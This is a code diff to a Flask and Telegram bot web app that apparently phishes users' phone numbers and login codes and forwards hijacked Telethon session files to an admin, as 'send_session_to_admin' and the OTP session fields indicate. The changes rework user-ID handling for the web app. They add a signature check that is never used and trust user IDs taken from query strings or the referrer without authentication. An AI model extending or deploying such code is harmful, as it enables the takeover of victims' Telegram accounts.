@@ -4,7 +4,7 @@ from telebot import types
 from telethon import TelegramClient
 from telethon.sessions import StringSession
 from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError, FloodWaitError
-from flask import Flask, render_template, request, jsonify
+from flask import Flask, render_template, request, jsonify, redirect
 import asyncio
 from datetime import datetime, timedelta
 import re
@@ -12,7 +12,10 @@ import time
 import threading
 import logging
 import sys
-import uuid
+import json
+import hashlib
+import hmac
+import urllib.parse
 
 # Setup logging
 logging.basicConfig(
@@ -228,14 +231,110 @@ def send_session_to_admin(session_file, phone, has_2fa=False):
         logger.error(f"Failed to send session file: {e}")
     return False
 
+def verify_telegram_webapp_data(init_data):
+    """Verify Telegram WebApp data signature"""
+    try:
+        # Parse the query string
+        parsed_data = urllib.parse.parse_qs(init_data)
+        
+        # Extract hash and remove it from data
+        hash_value = parsed_data.get('hash', [''])[0]
+        
+        # Create data check string
+        data_check_string_parts = []
+        
+        for key in sorted(parsed_data.keys()):
+            if key != 'hash':
+                value = parsed_data[key][0]
+                data_check_string_parts.append(f"{key}={value}")
+        
+        data_check_string = "\n".join(data_check_string_parts)
+        
+        # Compute secret key
+        secret_key = hmac.new(
+            key=b"WebAppData",
+            msg=BOT_TOKEN.encode(),
+            digestmod=hashlib.sha256
+        ).digest()
+        
+        # Compute HMAC SHA256
+        hmac_result = hmac.new(
+            key=secret_key,
+            msg=data_check_string.encode(),
+            digestmod=hashlib.sha256
+        ).hexdigest()
+        
+        # Compare hashes
+        return hmac_result == hash_value
+        
+    except Exception as e:
+        logger.error(f"Error verifying WebApp data: {e}")
+        return False
+
+def get_user_id_from_webapp_data(init_data):
+    """Extract user ID from Telegram WebApp data"""
+    try:
+        # Parse the query string
+        parsed_data = urllib.parse.parse_qs(init_data)
+        
+        # Get user JSON string
+        user_json_str = parsed_data.get('user', [''])[0]
+        if user_json_str:
+            user_data = json.loads(user_json_str)
+            return str(user_data.get('id', ''))
+        
+        # Alternative: get user ID directly from query params
+        user_id = parsed_data.get('user_id', [''])[0]
+        if user_id:
+            return user_id
+            
+        # Check for startapp parameter
+        start_param = parsed_data.get('startapp', [''])[0]
+        if start_param:
+            return start_param
+            
+    except Exception as e:
+        logger.error(f"Error extracting user ID: {e}")
+    
+    return None
+
 # ==================== FLASK ROUTES ====================
 @app.route('/')
 def index():
     """Main WebApp page"""
+    # Try to get user ID from multiple sources
+    user_id = None
+    
+    # 1. Try from query parameter (for direct links)
     user_id = request.args.get('user_id')
     
+    # 2. Try from Telegram WebApp init data
+    if not user_id and request.args.get('tgWebAppData'):
+        init_data = request.args.get('tgWebAppData')
+        user_id = get_user_id_from_webapp_data(init_data)
+    
+    # 3. Try from WebApp initData (JavaScript will set this)
+    if not user_id and request.args.get('initData'):
+        try:
+            init_data = urllib.parse.unquote(request.args.get('initData'))
+            user_id = get_user_id_from_webapp_data(init_data)
+        except:
+            pass
+    
     if not user_id:
-        return "User ID not provided. Please open from Telegram bot.", 400
+        # Try to get from referrer or create a placeholder
+        referrer = request.referrer
+        if referrer and 't.me' in referrer:
+            # Extract from Telegram URL pattern
+            match = re.search(r'user_id=(\d+)', referrer)
+            if match:
+                user_id = match.group(1)
+    
+    if not user_id:
+        # Create a temporary user ID for testing
+        # In production, you should require proper authentication
+        user_id = f"temp_{int(time.time())}"
+        logger.warning(f"Using temporary user ID: {user_id}")
     
     # Ensure session exists
     if user_id not in user_sessions:
@@ -246,7 +345,8 @@ def index():
             'expiry': datetime.now() + timedelta(seconds=session_expiry),
             'contact_received': False,
             'otp_sent': False,
-            'otp_attempts': 0
+            'otp_attempts': 0,
+            'source': 'webapp'
         }
         logger.info(f"Created new session for user: {user_id}")
     
@@ -255,7 +355,37 @@ def index():
     if session.get('otp_sent') and session.get('phone'):
         return render_template('otp.html', user_id=user_id, phone=session['phone'])
     
-    return render_template('index.html')
+    return render_template('index.html', user_id=user_id)
+
+@app.route('/webapp')
+def webapp_redirect():
+    """Redirect endpoint for WebApp with proper parameters"""
+    # Extract user ID from Telegram WebApp data
+    init_data = request.args.get('tgWebAppData', '')
+    
+    if init_data:
+        # Verify and extract user ID
+        user_id = get_user_id_from_webapp_data(init_data)
+        
+        if user_id:
+            # Create session
+            if user_id not in user_sessions:
+                user_sessions[user_id] = {
+                    'user_id': user_id,
+                    'status': 'waiting_for_contact',
+                    'created': datetime.now(),
+                    'expiry': datetime.now() + timedelta(seconds=session_expiry),
+                    'contact_received': False,
+                    'otp_sent': False,
+                    'otp_attempts': 0,
+                    'source': 'webapp'
+                }
+            
+            # Redirect to main page with user_id
+            return redirect(f'/?user_id={user_id}&tgWebAppData={urllib.parse.quote(init_data)}')
+    
+    # Fallback: redirect to main page
+    return redirect('/')
 
 @app.route('/api/check-otp-sent/<user_id>', methods=['GET'])
 def check_otp_sent(user_id):
@@ -307,45 +437,6 @@ def check_otp_sent(user_id):
         logger.error(f"Error in check-otp-sent: {e}")
         return jsonify({'success': False, 'error': str(e)})
 
-@app.route('/api/create-session', methods=['POST'])
-def create_session():
-    """Create session when WebApp opens"""
-    try:
-        data = request.json
-        user_id = data.get('user_id')
-        
-        if not user_id:
-            return jsonify({'success': False, 'error': 'User ID required'})
-        
-        # Generate a unique WebApp session ID
-        webapp_session_id = str(uuid.uuid4())
-        
-        # Map WebApp session to Telegram user ID
-        webapp_users[webapp_session_id] = user_id
-        
-        # Create initial session entry if not exists
-        if user_id not in user_sessions:
-            user_sessions[user_id] = {
-                'user_id': user_id,
-                'status': 'waiting_for_contact',
-                'created': datetime.now(),
-                'expiry': datetime.now() + timedelta(seconds=session_expiry),
-                'contact_received': False,
-                'otp_sent': False,
-                'otp_attempts': 0
-            }
-        
-        logger.info(f"WebApp session created for user {user_id}, session_id: {webapp_session_id}")
-        
-        return jsonify({
-            'success': True,
-            'webapp_session_id': webapp_session_id,
-            'message': 'Session created'
-        })
-    except Exception as e:
-        logger.error(f"Error in create-session: {e}")
-        return jsonify({'success': False, 'error': str(e)})
-
 @app.route('/otp')
 def otp_page():
     """OTP entry page"""
@@ -359,14 +450,14 @@ def otp_page():
     if user_id not in user_sessions:
         logger.warning(f"Session not found for user_id: {user_id}")
         # Redirect to index to create session
-        return render_template('index.html')
+        return redirect('/')
     
     session = user_sessions[user_id]
     
     if not session.get('otp_sent'):
         logger.warning(f"OTP not sent for user_id: {user_id}")
         # Redirect to index to send OTP
-        return render_template('index.html')
+        return redirect('/')
     
     phone = session.get('phone', 'Unknown')
     logger.info(f"Serving OTP page for {phone}")
@@ -539,7 +630,7 @@ def handle_start_help(message):
         logger.info(f"📨 Received /start from user_id: {user_id}")
         
         # Create WebApp URL with user_id as parameter
-        webapp_url = f"{WEBHOOK_URL.rstrip('/')}/?user_id={user_id}"
+        webapp_url = f"{WEBHOOK_URL.rstrip('/')}/webapp"
         
         # Create inline keyboard with WebApp button
         keyboard = types.InlineKeyboardMarkup()
